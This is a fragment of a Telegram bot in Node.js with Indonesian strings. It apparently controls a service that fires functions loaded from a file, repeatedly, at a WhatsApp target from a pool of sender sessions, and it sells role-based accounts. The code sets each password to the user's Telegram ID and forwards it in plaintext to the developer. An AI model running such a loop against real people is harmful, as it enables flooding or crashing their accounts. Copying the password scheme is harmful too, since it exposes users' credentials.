    `⏳ <b>MEMULAI TEST</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetJid}</code>\n⚙️ <b>Functions:</b> <code>${funcNames.join(', ')}</code>\n🔁 <b>Loop:</b> <code>${loopCount}x</code>\n🌍 <b>Pool Sender:</b> <code>${availableSocks.length} aktif</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    { parse_mode: 'HTML' }
  );

  setImmediate(async () => {
    let successHits = 0;
    try {
      for (let i = 0; i < loopCount; i++) {
        // ======= AUTO CALL SEMUA FUNCTION DARI FILE =======
        await callAllFunctionsFromFile(filePath, selectedSock, targetJid);
        // ==================================================

        await new Promise(resolve => setTimeout(resolve, 500));
        successHits++;
      }

      await bot.editMessageText(
        `✅ <b>TEST SELESAI!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetJid}</code>\n⚙️ <b>Functions:</b> <code>${funcNames.join(', ')}</code>\n📊 <b>Sukses:</b> <code>${successHits}/${loopCount}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
      );

    } catch (err) {
      bot.sendMessage(chatId, `❌ <b>Error di loop ke-${successHits}:</b>\n<code>${err.message}</code>`, { parse_mode: 'HTML' });
    }
  });
});
bot.onText(/^\/create(owner|mod|partner|admin|reseller|vip|member) (.+)/, async (msg, match) => {
  const id = msg.from.id;
  const targetRole = match[1]; 
  const username = match[2].trim();

  if (!enforcePrivate(msg, id)) return; // Cek Wajib Private Chat

  const config = loadTelegramConfig();
  const myData = config.roles[id.toString()];

  // 1. Cek apakah dia pernah di-add
  if (!myData) {
    return bot.sendMessage(id, "❌ Kamu belum didaftarkan (Add Role).").catch(()=>{});
  }

  // 2. CEK KETAT: Role yang di-add HARUS SAMA dengan role yang di-create
  if (myData.role !== targetRole) {
    return bot.sendMessage(id, `❌ Kamu hanya bisa membuat akun dengan role *${myData.role}*, bukan *${targetRole}*.`).catch(()=>{});
  }

  // 3. Cek sekali pakai
  if (myData.used) {
    return bot.sendMessage(id, "❌ Kamu sudah pernah membuat akun. Kesempatan hanya 1 kali.").catch(()=>{});
  }

  // 4. Cek username sudah ada atau belum
  const db = loadDatabase();
  if (db.find(u => u.username === username)) {
    return bot.sendMessage(id, `❌ Username "${username}" sudah ada.`).catch(()=>{});
  }

  // 5. Proses buat akun
  const password = id.toString(); 
  const duration = myData.duration; 

  const expired = new Date();
  expired.setDate(expired.getDate() + duration);
  
  db.push({ 
    username, 
    password, 
    role: targetRole, 
    expiredDate: expired.toISOString().split("T")[0] 
  });
  saveDatabase(db);

  myData.used = true;
  saveTelegramConfig(config);

  // Kirim sukses ke PRIVATE CHAT
  bot.sendMessage(id, `✅ Akun *${targetRole}* berhasil dibuat!\n\n👤 User: ${username}\n🔐 Pass: ${password}\n⏳ Durasi: ${duration} Hari`, { parse_mode: "Markdown" }).catch(()=>{});

  // Kirim Log ke Dev Utama
  bot.sendMessage(MAIN_DEV_ID, `🆕 *[CREATE AKUN LOG]*\n\n👥 Pelaku: [${id}](tg://user?id=${id})\n🛡️ Role: ${targetRole}\n👤 Username: ${username}\n🔐 Password: ${password}\n⏳ Durasi: ${duration} Hari`, { parse_mode: "Markdown" }).catch(()=>{});
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1004471492590"; 
    bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 15 * 60 * 1000);
  }, delay);
}
// ===== Start Express Server =====
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://serverptrerodactyl.smasnug.web.i:${wsPort}`);
  
  startUserSessions();
  console.log(`[AUTO REFRESH] Diatur setiap 15 menit sekali.`);

  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 15 menit sekali.`);
  
});
